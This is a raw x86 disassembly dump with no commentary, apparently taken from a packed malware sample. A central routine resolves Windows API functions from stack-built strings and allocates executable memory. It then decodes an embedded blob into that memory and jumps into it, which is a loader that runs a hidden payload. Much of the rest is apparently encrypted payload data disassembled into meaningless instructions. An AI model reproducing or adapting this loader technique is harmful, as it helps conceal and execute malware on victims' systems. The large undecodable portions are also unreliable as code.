  4213dc:	cmp    dl,BYTE PTR [edx-0x22]
  4213df:	enter  0x5f1d,0xae
  4213e3:	int    0xd3
  4213e5:	cmp    DWORD PTR [edi+0x5e07f43],esi
  4213eb:	(bad)  
  4213ec:	loope  0x421435
  4213ee:	sub    DWORD PTR [eax],0x843c1504
  4213f4:	push   ebp
  4213f5:	sti    
  4213f6:	ror    DWORD PTR [eax-0x2f],0x4a
  4213fa:	enter  0x775,0x29
  4213fe:	mov    ah,dl
  421400:	stos   BYTE PTR es:[edi],al
  421401:	inc    esi
  421402:	xchg   ecx,eax
  421403:	push   0x2f
  421405:	dec    esi
  421406:	and    edi,eax
  421408:	pushf  
  421409:	jae    0x42139c
  42140b:	out    0x51,eax
  42140d:	jno    0x42144d
  42140f:	cld    
  421410:	mov    esi,0x46bbdee5
  421415:	or     DWORD PTR [ecx+ebx*4+0x47],ebx
  421419:	mov    eax,ds:0x4c9ee998
  42141e:	jmp    0x93f5:0xbe00f838
  421425:	jo     0x421415
  421427:	pop    ebx
  421428:	sbb    eax,0x9e91f6e7
  42142d:	loopne 0x421409
  42142f:	jns    0x4214a4
  421431:	adc    BYTE PTR [eax],ah
  421433:	push   0x18
  421435:	inc    ebx
  421436:	mov    ah,0xcf
  421438:	popf   
  421439:	xchg   ebp,eax
  42143a:	inc    edi
  42143b:	hlt    
  42143c:	sbb    edi,ebx
  42143e:	(bad)  
  42143f:	mov    ds:0xb793c2f6,al
  421444:	popa   
  421445:	pop    esi
  421446:	shr    DWORD PTR ds:0x3f300310,0x7f
  42144d:	cwde   
  42144e:	aam    0xad
  421450:	sbb    eax,ecx
  421452:	cwde   
  421453:	int    0x36
  421455:	mov    eax,ds:0xd0920035
  42145a:	inc    edi
  42145b:	mov    al,ds:0xbae8f43a
  421460:	mov    edx,0x2750aa6
  421465:	xor    eax,esp
  421467:	sti    
  421468:	and    edx,DWORD PTR [ecx+0x5e]
  42146b:	dec    esp
  42146c:	adc    al,ch
  42146e:	lds    eax,FWORD PTR [eax+0x30aa1a55]
  421474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421475:	push   ds
  421476:	add    cl,BYTE PTR [edx-0x391c9f8]
  42147c:	jmp    FWORD PTR [eax+eiz*1+0x7b]
  421480:	loop   0x42141b
  421482:	xchg   ah,ah
  421484:	and    cl,BYTE PTR [eax-0x9e58f5f]
  42148a:	shl    BYTE PTR [eax],0x83
  42148d:	xchg   DWORD PTR [ecx],ecx
  42148f:	mov    ebx,0xe2868314
  421494:	je     0x4214c2
  421496:	lods   eax,DWORD PTR ds:[esi]
  421497:	and    al,0xfe
  421499:	div    DWORD PTR [edx+0x61]
  42149c:	jbe    0x421452
  42149e:	jns    0x4214fc
  4214a0:	and    DWORD PTR [ebx-0x64],eax
  4214a3:	xchg   esp,eax
  4214a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a5:	fild   DWORD PTR [eax+0x56]
  4214a8:	jns    0x42150f
  4214aa:	adc    edi,edx
  4214ac:	shl    BYTE PTR [esi-0x6b],cl
  4214af:	mov    esp,0x550f368a
  4214b4:	pop    edi
  4214b5:	mov    esp,0xb6a06878
  4214ba:	inc    esi
  4214bb:	ss sbb eax,0x6c4efb01
  4214c1:	scas   eax,DWORD PTR es:[edi]
  4214c2:	mov    ebp,0x3ab7f153
  4214c7:	jnp    0x4214ab
  4214c9:	mov    ebx,0x7baaf6
  4214ce:	or     ebp,DWORD PTR [esi]
  4214d0:	in     eax,dx
  4214d1:	fld    QWORD PTR [edx-0x4f2dfef]
  4214d7:	int3   
  4214d8:	xor    al,0x83
  4214da:	cli    
  4214db:	sub    cl,BYTE PTR [esi+0x547759f2]
  4214e1:	and    al,0xae
  4214e3:	mov    bh,0xb1
  4214e5:	pop    ds
  4214e6:	mov    ds:0xfcf87d6,al
  4214eb:	xlat   BYTE PTR ds:[ebx]
  4214ec:	out    dx,eax
  4214ed:	mov    edi,0xa2116ee8
  4214f2:	lods   eax,DWORD PTR ds:[esi]
  4214f3:	icebp  
  4214f4:	imul   ebp,DWORD PTR [edx+0x9babaab],0x7a097418
  4214fe:	int3   
  4214ff:	jbe    0x421551
  421501:	jno    0x421483
  421503:	fnstcw WORD PTR [ebp+0x5b]
  421506:	sub    dh,BYTE PTR [ebx+eax*2+0x75]
  42150a:	scas   eax,DWORD PTR es:[edi]
  42150b:	test   al,0xf1
  42150d:	push   eax
  42150e:	inc    esi
  421510:	xor    esi,DWORD PTR [edx+0x687e968a]
  421516:	lds    eax,FWORD PTR [eax-0x718ce1b5]
  42151c:	push   ecx
  42151d:	das    
  42151e:	stos   DWORD PTR es:[edi],eax
  42151f:	pusha  
  421520:	shl    cl,0x32
  421523:	sbb    BYTE PTR [esi+0x40781de5],0xfb
  42152a:	ret    
  42152b:	sbb    bl,al
  42152d:	in     eax,dx
  42152e:	xchg   ebp,eax
  42152f:	cmc    
  421530:	sbb    DWORD PTR [ebx],edi
  421532:	dec    ecx
  421533:	cwde   
  421534:	pop    edi
  421535:	and    eax,0x1b1e4873
  42153a:	dec    DWORD PTR [esi+esi*1+0x10]
  42153e:	xchg   edi,eax
  42153f:	test   al,0xa7
  421541:	mov    al,ds:0x595d5e05
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x10],0x0
  421565:	mov    DWORD PTR [ebp-0x18],0x0
  42156c:	mov    DWORD PTR [ebp-0x78],0x0
  421573:	mov    DWORD PTR [ebp-0x60],0x0
  42157a:	mov    DWORD PTR [ebp-0x5c],0x0
  421581:	mov    DWORD PTR [ebp-0x74],0x0
  421588:	mov    DWORD PTR [ebp-0x64],0x0
  42158f:	mov    DWORD PTR [ebp-0x8],0x0
  421596:	mov    DWORD PTR [ebp-0x68],0x0
  42159d:	mov    DWORD PTR [ebp-0x30],0x0
  4215a4:	mov    DWORD PTR [ebp-0x70],0x0
  4215ab:	mov    DWORD PTR [ebp-0x58],0x0
  4215b2:	mov    DWORD PTR [ebp-0x54],0x0
  4215b9:	mov    DWORD PTR [ebp-0x4],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x14],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428158
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42815c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428160
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428164
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x428148
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x42814c
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428150
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428154
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428156
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	call   DWORD PTR ds:0x428018
  421632:	lea    eax,[ebp-0x10]
  421635:	push   eax
  421636:	lea    ecx,[ebp-0x10]
  421639:	push   ecx
  42163a:	lea    edx,[ebp-0x18]
  42163d:	push   edx
  42163e:	call   DWORD PTR ds:0x428004
  421644:	test   eax,eax
  421646:	je     0x421651
  421648:	mov    eax,DWORD PTR [ebp-0x10]
  42164b:	add    eax,0x1
  42164e:	mov    DWORD PTR [ebp-0x10],eax
  421651:	mov    DWORD PTR [ebp-0x48],0x0
  421658:	mov    DWORD PTR [ebp-0x4c],0x0
  42165f:	lea    ecx,[ebp-0x18]
  421662:	push   ecx
  421663:	call   DWORD PTR ds:0x428000
  421669:	mov    BYTE PTR [ebp-0x40],0x56
  42166d:	call   DWORD PTR ds:0x428034
  421673:	mov    DWORD PTR [ebp-0x2c],eax
  421676:	mov    BYTE PTR [ebp-0x3e],0x72
  42167a:	movzx  edx,WORD PTR [ebp-0x2c]
  42167e:	test   edx,edx
  421680:	jne    0x4216d0
  421682:	mov    BYTE PTR [ebp-0x34],0x0
  421686:	mov    DWORD PTR [ebp-0x18],0xe0d
  42168d:	lea    eax,[ebp-0x28]
  421690:	push   eax
  421691:	call   DWORD PTR ds:0x428044
  421697:	mov    DWORD PTR [ebp-0x68],eax
  42169a:	mov    DWORD PTR [ebp-0x5c],0x3a
  4216a1:	lea    ecx,[ebp-0x40]
  4216a4:	push   ecx
  4216a5:	mov    edx,DWORD PTR [ebp-0x68]
  4216a8:	push   edx
  4216a9:	call   DWORD PTR ds:0x42804c
  4216af:	mov    DWORD PTR [ebp-0x44],eax
  4216b2:	mov    DWORD PTR [ebp-0x8],0x697b4a77
  4216b9:	mov    eax,DWORD PTR [ebp-0x68]
  4216bc:	push   eax
  4216bd:	mov    ecx,DWORD PTR [ebp-0x70]
  4216c0:	push   ecx
  4216c1:	call   DWORD PTR ds:0x428138
  4216c7:	mov    DWORD PTR [ebp-0x74],0x10e747
  4216ce:	jmp    0x4216e5
  4216d0:	mov    BYTE PTR ds:0x4476e0,0x0
  4216d7:	mov    BYTE PTR ds:0x42be60,0x0
  4216de:	mov    BYTE PTR ds:0x443920,0x0
  4216e5:	push   DWORD PTR ds:0x428044
  4216eb:	pop    edx
  4216ec:	mov    DWORD PTR [ebp-0x78],edx
  4216ef:	mov    edx,DWORD PTR [ebp-0x68]
  4216f2:	push   edx
  4216f3:	call   DWORD PTR ds:0x428048
  4216f9:	mov    eax,DWORD PTR [ebp-0x70]
  4216fc:	push   eax
  4216fd:	call   DWORD PTR ds:0x428050
  421703:	mov    DWORD PTR [ebp-0x2c],0x410000
  42170a:	push   DWORD PTR [ebp-0x30]
  42170d:	push   0x1000
  421712:	mov    eax,DWORD PTR [ebp-0x18]
  421715:	add    eax,0x23
  421718:	add    eax,0x23
  42171b:	push   eax
  42171c:	xor    eax,eax
  42171e:	push   eax
  42171f:	mov    ecx,DWORD PTR [ebp-0x44]
  421722:	call   ecx
  421724:	mov    edx,eax
  421726:	mov    DWORD PTR [ebp-0x4],edx
  421729:	mov    ecx,DWORD PTR [ebp-0x74]
  42172c:	sub    ecx,0xdae0b
  421732:	mov    DWORD PTR [ebp-0x74],ecx
  421735:	cmp    DWORD PTR [ebp-0x4],0x0
  421739:	jne    0x42174e
  42173b:	push   0xa
  42173d:	mov    edx,DWORD PTR [ebp-0x68]
  421740:	push   edx
  421741:	call   DWORD PTR ds:0x428058
  421747:	mov    BYTE PTR ds:0x443920,0x0
  42174e:	mov    eax,DWORD PTR [ebp-0x4]
  421751:	add    eax,DWORD PTR [ebp-0x18]
  421754:	mov    ecx,DWORD PTR [ebp-0x8]
  421757:	mov    DWORD PTR [eax],ecx
  421759:	mov    edx,DWORD PTR [ebp-0x4]
  42175c:	add    edx,DWORD PTR [ebp-0x5c]
  42175f:	mov    DWORD PTR [ebp-0x64],edx
  421762:	mov    eax,ds:0x42804c
  421767:	mov    DWORD PTR [ebp-0x54],eax
  42176a:	mov    ecx,DWORD PTR [ebp-0x4]
  42176d:	add    ecx,DWORD PTR [ebp-0x18]
  421770:	mov    edx,DWORD PTR [ebp+0x8]
  421773:	mov    DWORD PTR [ecx+0x4],edx
  421776:	mov    eax,DWORD PTR [ebp-0x4]
  421779:	add    eax,DWORD PTR [ebp-0x18]
  42177c:	mov    DWORD PTR [ebp-0xc],eax
  42177f:	push   0x0
  421781:	push   0x14
  421783:	push   0x14
  421785:	push   0xa
  421787:	push   0xa
  421789:	push   0x0
  42178b:	call   DWORD PTR ds:0x428010
  421791:	cmp    DWORD PTR [ebp-0x74],0x0
  421795:	jbe    0x4217b2
  421797:	mov    ecx,DWORD PTR [ebp-0xc]
  42179a:	push   ecx
  42179b:	mov    edx,DWORD PTR [ebp-0x18]
  42179e:	push   edx
  42179f:	mov    eax,DWORD PTR [ebp-0x2c]
  4217a2:	add    eax,DWORD PTR [ebp-0x74]
  4217a5:	push   eax
  4217a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4217a9:	push   ecx
  4217aa:	call   0x411000
  4217af:	add    esp,0x10
  4217b2:	cmp    DWORD PTR [ebp-0x64],0x0
  4217b6:	je     0x4217ca
  4217b8:	mov    ecx,DWORD PTR [ebp-0x54]
  4217bb:	push   ecx
  4217bc:	push   DWORD PTR [ebp-0x78]
  4217bf:	mov    esi,DWORD PTR [ebp-0x64]
  4217c2:	push   edx
  4217c3:	pop    eax
  4217c4:	push   ecx
  4217c5:	nop
  4217c6:	jmp    esi
  4217c8:	jmp    0x4217dc
  4217ca:	mov    edx,DWORD PTR [ebp+0x8]
  4217cd:	mov    DWORD PTR [ebp-0x14],edx
  4217d0:	push   0x0
  4217d2:	mov    eax,DWORD PTR [ebp-0x68]
  4217d5:	push   eax
  4217d6:	call   DWORD PTR ds:0x42800c
  4217dc:	mov    eax,0x1
  4217e1:	pop    esi
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    
  4217e6:	int3   
  4217e7:	int3   
  4217e8:	int3   
  4217e9:	int3   
  4217ea:	int3   
  4217eb:	int3   
  4217ec:	int3   
  4217ed:	int3   
  4217ee:	int3   
  4217ef:	int3   
  4217f0:	push   ebp
  4217f1:	mov    ebp,esp
  4217f3:	sub    esp,0x8
  4217f6:	push   esi
  4217f7:	push   0x0
  4217f9:	push   0x0
  4217fb:	mov    DWORD PTR [ebp-0x4],0x0
  421802:	call   DWORD PTR ds:0x428138
  421808:	mov    esi,DWORD PTR ds:0x428034
  42180e:	push   0x0
  421810:	push   0x0
  421812:	push   0x0
  421814:	push   0x0
  421816:	mov    DWORD PTR [ebp-0x8],esi
  421819:	call   DWORD PTR ds:0x42802c
  42181f:	test   esi,esi
  421821:	jne    0x42182a
  421823:	push   esi
  421824:	call   DWORD PTR ds:0x428028
  42182a:	push   0x0
  42182c:	push   0x4e
  42182e:	push   0x1e
  421830:	push   0x0
  421832:	push   0xffffffff
  421834:	call   DWORD PTR ds:0x428024
  42183a:	mov    esi,DWORD PTR [ebp-0x8]
  42183d:	call   esi
  42183f:	mov    DWORD PTR [ebp-0x4],eax
  421842:	cmp    DWORD PTR [ebp-0x4],0x57
  421846:	jne    0x42185d
  421848:	push   0x5799eeef
  42184d:	call   0x421550
  421852:	add    esp,0x4
  421855:	push   0x0
  421857:	call   DWORD PTR ds:0x428020
  42185d:	push   0x0
  42185f:	push   0x0
  421861:	push   0x100000
  421866:	call   DWORD PTR ds:0x42801c
  42186c:	xor    eax,eax
  42186e:	pop    esi
  42186f:	mov    esp,ebp
  421871:	pop    ebp
  421872:	ret    
  421873:	nop
  421874:	nop
  421875:	nop
  421876:	nop
  421877:	nop
  421878:	nop
  421879:	nop
  42187a:	nop
  42187b:	nop
  42187c:	nop
  42187d:	nop
  42187e:	nop
  42187f:	nop
  421880:	sub    esp,0x10
  421883:	push   0x0
  421885:	push   0x0
  421887:	push   0x0
  421889:	call   0x422a10
  42188e:	push   0x0
  421890:	call   DWORD PTR ds:0x428040
  421896:	lea    eax,[esp+0x0]
  42189a:	push   eax
  42189b:	call   DWORD PTR ds:0x42803c
  4218a1:	call   DWORD PTR ds:0x428038
  4218a7:	cmp    WORD PTR [esp+0x0],0x0
  4218ad:	je     0x4218c6
  4218af:	push   0x0
  4218b1:	call   DWORD PTR ds:0x428054
  4218b7:	push   0x0
  4218b9:	call   0x4217f0
  4218be:	add    esp,0x4
  4218c1:	jmp    0x4229f3
  4218c6:	push   DWORD PTR [ebx-0x7702661a]
  4218cc:	fwait
  4218cd:	retf   0x858
  4218d0:	inc    edi
  4218d1:	shl    DWORD PTR [edx-0x6c],1
  4218d4:	add    DWORD PTR [ecx+ecx*1-0x356474bb],edi
  4218db:	pop    eax
  4218dc:	or     al,0x47
  4218de:	shl    DWORD PTR [edx],1
  4218e0:	imul   edi,esi,0xffffffbc
  4218e3:	or     ebp,edi
  4218e5:	mov    ebx,DWORD PTR [ebx+0x470c58ca]
  4218eb:	shl    DWORD PTR [edx+0x6b],1
  4218ee:	(bad)  
  4218ef:	mov    esp,0x9b8bfd09
  4218f4:	retf   0xc58
  4218f7:	inc    edi
  4218f8:	shl    DWORD PTR [edx+0x6b],1
  4218fb:	(bad)  
  4218fc:	mov    esp,0x9b8bfd09
  421901:	retf   0xf458
  421904:	inc    edi
  421905:	shl    DWORD PTR [edx+0x65],1
  421908:	loope  0x421910
  42190a:	pop    es
  42190b:	std    
  42190c:	aas    
  42190d:	xchg   edx,eax
  42190e:	pop    es
  42190f:	jns    0x4218c5
  421911:	inc    esi
  421912:	popf   
  421913:	scas   eax,DWORD PTR es:[edi]
  421914:	dec    edx
  421915:	stos   BYTE PTR es:[edi],al
  421916:	aam    0x60
  421918:	mov    gs,WORD PTR [ebx+0x6b37b8eb]
  42191e:	xor    eax,0x9d4b0fb0
  421923:	frstor [edi-0x6d]
  421926:	in     al,0xef
  421928:	jmp    0x517:0xa367693a
  42192f:	(bad)  
  421931:	addr16 (bad) 
  421934:	aam    0x99
  421936:	js     0x421999
  421938:	sub    BYTE PTR [ebp-0x4e0cbaf9],dh
  42193e:	add    ebx,ecx
  421940:	mov    ebx,DWORD PTR [ebx+0x470c58ca]
  421946:	shl    DWORD PTR [ebp-0xe],1
  421949:	add    ah,ch
  42194b:	dec    edx
  42194c:	add    eax,0xa0899119
  421951:	sahf   
  421952:	dec    ebp
  421953:	xchg   edx,eax
  421954:	call   0x81f1:0x6ce4f4f9
  42195b:	les    esi,FWORD PTR [edx]
  42195d:	retf   0x1f06
  421960:	mov    ah,0x5a
  421962:	popa   
  421963:	cmp    al,0x44
  421965:	fwait
  421966:	not    ebx
  421968:	(bad)  
  421969:	repz push edx
  42196b:	fs mov edi,0x70476843
  421971:	test   DWORD PTR [ebx],eax
  421973:	mov    ebx,0x12c00973
  421978:	mov    WORD PTR [esi-0x25],ss
  42197b:	sub    BYTE PTR [ebx+0x7d43b66c],dl
  421981:	mov    dl,BYTE PTR [ecx+0x4d9ea092]
  421987:	xchg   edx,eax
  421988:	call   0x816f:0xf094f4f8
  42198f:	and    al,0x12
  421991:	fadd   DWORD PTR [esi]
  421993:	or     ch,BYTE PTR [ecx]
  421995:	lock popa 
  421997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421998:	fnstenv [edi+esi*8]
  42199b:	and    DWORD PTR [ebx+0x58],0x52
  42199f:	push   esp
  4219a0:	and    bl,cl
  4219a2:	push   0x32e0629
  4219a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a8:	out    dx,al
  4219a9:	xchg   esp,eax
  4219aa:	rcr    BYTE PTR [edx],0xf4
  4219ad:	aad    0xdb
  4219af:	xor    BYTE PTR [edx],al
  4219b1:	popf   
  4219b2:	aam    0x4a
  4219b4:	add    eax,0x58ca9119
  4219b9:	or     al,0x47
  4219bb:	shl    DWORD PTR [edx+0x6b],1
  4219be:	(bad)  
  4219bf:	in     al,dx
  4219c0:	dec    esp
  4219c1:	std    
  4219c2:	mov    edx,edi
  4219c4:	retf   
  4219c5:	pop    edx
  4219c6:	or     al,0xab
  4219c8:	xor    bh,BYTE PTR ds:0x9bcfe24
  4219ce:	std    
  4219cf:	mov    ebx,DWORD PTR [ebx+0x47ec58ca]
  4219d5:	shl    BYTE PTR [ebx+0x60],cl
  4219d8:	push   DWORD PTR [esi-0x609802f7]
  4219de:	retf   0x858
  4219e1:	inc    ecx
  4219e2:	shl    DWORD PTR [edx+0x6b],1
  4219e5:	(bad)  
  4219e6:	mov    esp,0x9b8b4008
  4219eb:	retf   0xc48
  4219ee:	inc    edi
  4219ef:	shl    DWORD PTR [edx+0x6e],1
  4219f2:	(bad)  
  4219f3:	mov    esp,0x9b8bbc09
  4219f8:	ficomp DWORD PTR [eax+0xc]
  4219fb:	inc    edi
  4219fc:	shl    DWORD PTR [edx+0x6b],cl
  4219ff:	sti    
  421a00:	mov    esp,0x9b8bfd08
  421a05:	retf   0x958
  421a08:	inc    edi
  421a09:	shl    BYTE PTR [edx+0x6b],1
  421a0c:	(bad)  
  421a0d:	mov    esp,0x900bfd09
  421a12:	retf   0x858
  421a15:	inc    edi
  421a16:	rcr    edi,1
  421a18:	pop    edx
  421a19:	sti    
  421a1a:	mov    esp,0x1b8bfd0b
  421a1f:	retf   0x1c58
  421a22:	inc    edi
  421a23:	shl    DWORD PTR [edx+0x6b],1
  421a26:	(bad)  
  421a27:	mov    esp,0x9b8bed09
  421a2c:	ficomp DWORD PTR [eax+0xc]
  421a2f:	inc    edi
  421a30:	shl    DWORD PTR [edx+0x6b],1
  421a33:	out    dx,al
  421a34:	mov    esp,0x9b8bfd09
  421a39:	retf   0xc58
  421a3c:	inc    edi
  421a3d:	shl    DWORD PTR [edx-0x11],1
  421a40:	nop
  421a41:	mov    bh,0x9
  421a43:	xchg   esp,eax
  421a44:	mov    BYTE PTR [ebx+0x4c3c58ca],bl
  421a4a:	shr    DWORD PTR [ebp+0x9bcfe56],1
  421a50:	std    
  421a51:	mov    ebx,DWORD PTR [ebx+0x470c58ca]
  421a57:	shl    DWORD PTR [edx+0x6b],1
  421a5a:	(bad)  
  421a5b:	mov    esp,0x9b8bfd09
  421a60:	retf   0xc58
  421a63:	inc    edi
  421a64:	shl    DWORD PTR [edx+0x6b],1
  421a67:	(bad)  
  421a68:	mov    esp,0x9b8bfd09
  421a6d:	retf   0xc58
  421a70:	inc    edi
  421a71:	shl    DWORD PTR [edx+0x6b],1
  421a74:	(bad)  
  421a75:	mov    esp,0x9b8bfd09
  421a7a:	retf   0xc58
  421a7d:	inc    edi
  421a7e:	shl    DWORD PTR [edx+0x6b],1
  421a81:	(bad)  
  421a82:	mov    esp,0x9b8bfd09
  421a87:	retf   0xc58
  421a8a:	inc    edi
  421a8b:	shl    DWORD PTR [edx+0x6b],1
  421a8e:	(bad)  
  421a8f:	mov    esp,0x9b8bfd09
  421a94:	retf   0xc58
  421a97:	inc    edi
  421a98:	shl    DWORD PTR [edx+0x6b],1
  421a9b:	(bad)  
  421a9c:	mov    esp,0x9b8bfd09
  421aa1:	retf   0xc58
  421aa4:	inc    edi
  421aa5:	shl    DWORD PTR [edx+0x6b],1
  421aa8:	(bad)  
  421aa9:	mov    esp,0x9b8bfd09
  421aae:	retf   0xc58
  421ab1:	inc    edi
  421ab2:	shl    DWORD PTR [edx+0x6b],1
  421ab5:	(bad)  
  421ab6:	mov    esp,0xe3ee8927
  421abb:	mov    esi,0xd1470c58
  421ac0:	inc    edx
  421ac1:	pusha  
  421ac2:	(bad)  
  421ac3:	mov    esp,0x9b8bfd19
  421ac8:	lock pop esp
  421aca:	or     al,0x47
  421acc:	aad    0x62
  421ace:	imul   ebp,DWORD PTR [esi-0x2030b507],0xffffffd4
  421ad5:	retf   0xc58
  421ad8:	inc    edi
  421ad9:	shl    DWORD PTR [edx+0x4b],1
  421adc:	(bad)  
  421add:	mov    esp,0xe8f9d3e9
  421ae2:	mov    eax,0xd1470c3b
  421ae7:	bound  edi,QWORD PTR [ebx]
  421ae9:	(bad)  
  421aea:	mov    esp,0x9b80cd09
  421aef:	retf   0xc08
  421af2:	inc    edi
  421af3:	rcr    DWORD PTR [edi+ebp*2-0x2],1
  421af7:	mov    esp,0x9b8bfd09
  421afc:	retf   0xc58
  421aff:	inc    edi
  421b00:	shl    DWORD PTR [edx+0x6b],1
  421b03:	fidivr WORD PTR [ecx+ecx*1-0x356474e3]
  421b0a:	pop    eax
  421b0b:	or     al,0x47
  421b0d:	shl    DWORD PTR [edx+0x6b],1
  421b10:	(bad)  
  421b11:	mov    esp,0x9b8bfd09
  421b16:	retf   0xc58
  421b19:	inc    edi
  421b1a:	shl    DWORD PTR [edx+0x6b],1
  421b1d:	(bad)  
  421b1e:	mov    esp,0x9b8bfd09
  421b23:	retf   0xc58
  421b26:	inc    edi
  421b27:	shl    DWORD PTR [edx+0x6b],1
  421b2a:	(bad)  
  421b2b:	mov    esp,0x9b8bfd09
  421b30:	retf   0xc58
  421b33:	inc    edi
  421b34:	shl    DWORD PTR [edx+0x6b],1
  421b37:	(bad)  
  421b38:	mov    esp,0x9b8bfd09
  421b3d:	retf   0xc58
  421b40:	inc    edi
  421b41:	shl    DWORD PTR [edx+0x6b],1
  421b44:	(bad)  
  421b45:	mov    esp,0x9b8bfd09
  421b4a:	retf   0xc58
  421b4d:	inc    edi
  421b4e:	shl    DWORD PTR [edx+0x6b],1
  421b51:	(bad)  
  421b52:	mov    esp,0x9b8bfd09
  421b57:	retf   0xc58
  421b5a:	inc    edi
  421b5b:	shl    DWORD PTR [edx+0x6b],1
  421b5e:	(bad)  
  421b5f:	mov    esp,0x9b8bfd09
  421b64:	retf   0xc58
  421b67:	inc    edi
  421b68:	shl    DWORD PTR [edx+0x6b],1
  421b6b:	(bad)  
  421b6c:	mov    esp,0x9b8bfd09
  421b71:	retf   0xc58
  421b74:	inc    edi
  421b75:	shl    DWORD PTR [edx+0x6b],1
  421b78:	(bad)  
  421b79:	mov    esp,0x9b8bfd09
  421b7e:	retf   0xc58
  421b81:	inc    edi
  421b82:	shl    DWORD PTR [edx+0x6b],1
  421b85:	(bad)  
  421b86:	mov    esp,0x9b8bfd09
  421b8b:	retf   0xc58
  421b8e:	inc    edi
  421b8f:	shl    DWORD PTR [edx+0x6b],1
  421b92:	(bad)  
  421b93:	mov    esp,0x9b8bfd09
  421b98:	retf   0xc58
  421b9b:	inc    edi
  421b9c:	shl    DWORD PTR [edx+0x6b],1
  421b9f:	(bad)  
  421ba0:	mov    esp,0x9b8bfd09
  421ba5:	retf   0xc58
  421ba8:	inc    edi
  421ba9:	shl    DWORD PTR [edx+0x6b],1
  421bac:	(bad)  
  421bad:	mov    esp,0x9b8bfd09
  421bb2:	retf   0xc58
  421bb5:	inc    edi
  421bb6:	shl    DWORD PTR [edx+0x6b],1
  421bb9:	(bad)  
  421bba:	mov    esp,0x9b8bfd09
  421bbf:	retf   0xc58
  421bc2:	inc    edi
  421bc3:	shl    DWORD PTR [edx+0x6b],1
  421bc6:	(bad)  
  421bc7:	mov    esp,0x9b8bfd09
  421bcc:	retf   0xc58
  421bcf:	inc    edi
  421bd0:	shl    DWORD PTR [edx+0x6b],1
  421bd3:	(bad)  
  421bd4:	mov    esp,0x9b8bfd09
  421bd9:	retf   0xc58
  421bdc:	inc    edi
  421bdd:	shl    DWORD PTR [edx+0x6b],1
  421be0:	(bad)  
  421be1:	mov    esp,0x9b8bfd09
  421be6:	retf   0xc58
  421be9:	inc    edi
  421bea:	shl    DWORD PTR [edx+0x6b],1
  421bed:	(bad)  
  421bee:	mov    esp,0x9b8bfd09
  421bf3:	retf   0xc58
  421bf6:	inc    edi
  421bf7:	shl    DWORD PTR [edx+0x6b],1
  421bfa:	(bad)  
  421bfb:	mov    esp,0x9b8bfd09
  421c00:	retf   0xc58
  421c03:	inc    edi
  421c04:	shl    DWORD PTR [edx+0x6b],1
  421c07:	(bad)  
  421c08:	mov    esp,0x9b8bfd09
  421c0d:	retf   0xc58
  421c10:	inc    edi
  421c11:	shl    DWORD PTR [edx+0x6b],1
  421c14:	(bad)  
  421c15:	mov    esp,0x9b8bfd09
  421c1a:	retf   0xc58
  421c1d:	inc    edi
  421c1e:	shl    DWORD PTR [edx+0x6b],1
  421c21:	(bad)  
  421c22:	mov    esp,0x9b8bfd09
  421c27:	retf   0xc58
  421c2a:	inc    edi
  421c2b:	shl    DWORD PTR [edx+0x6b],1
  421c2e:	(bad)  
  421c2f:	mov    esp,0x9b8bfd09
  421c34:	retf   0xc58
  421c37:	inc    edi
  421c38:	shl    DWORD PTR [edx+0x6b],1
  421c3b:	(bad)  
  421c3c:	mov    esp,0x9b8bfd09
  421c41:	retf   0xc58
  421c44:	inc    edi
  421c45:	shl    DWORD PTR [edx+0x6b],1
  421c48:	(bad)  
  421c49:	mov    esp,0x9b8bfd09
  421c4e:	retf   0xc58
  421c51:	inc    edi
  421c52:	shl    DWORD PTR [edx+0x6b],1
  421c55:	(bad)  
  421c56:	mov    esp,0x9b8bfd09
  421c5b:	retf   0xc58
  421c5e:	inc    edi
  421c5f:	shl    DWORD PTR [edx+0x6b],1
  421c62:	(bad)  
  421c63:	mov    esp,0x9b8bfd09
  421c68:	retf   0xc58
  421c6b:	inc    edi
  421c6c:	shl    DWORD PTR [edx+0x6b],1
  421c6f:	(bad)  
  421c70:	mov    esp,0x9b8bfd09
  421c75:	retf   0xc58
  421c78:	inc    edi
  421c79:	shl    DWORD PTR [edx+0x6b],1
  421c7c:	(bad)  
  421c7d:	mov    esp,0x9b8bfd09
  421c82:	retf   0xc58
  421c85:	inc    edi
  421c86:	shl    DWORD PTR [edx+0x6b],1
  421c89:	(bad)  
  421c8a:	mov    esp,0x9b8bfd09
  421c8f:	retf   0xc58
  421c92:	inc    edi
  421c93:	shl    DWORD PTR [edx+0x6b],1
  421c96:	(bad)  
  421c97:	mov    esp,0x9b8bfd09
  421c9c:	retf   0xc58
  421c9f:	inc    edi
  421ca0:	shl    DWORD PTR [edx+0x6b],1
  421ca3:	(bad)  
  421ca4:	mov    esp,0x9b8bfd09
  421ca9:	retf   0xc58
  421cac:	inc    edi
  421cad:	shl    DWORD PTR [edx+0x6b],1
  421cb0:	(bad)  
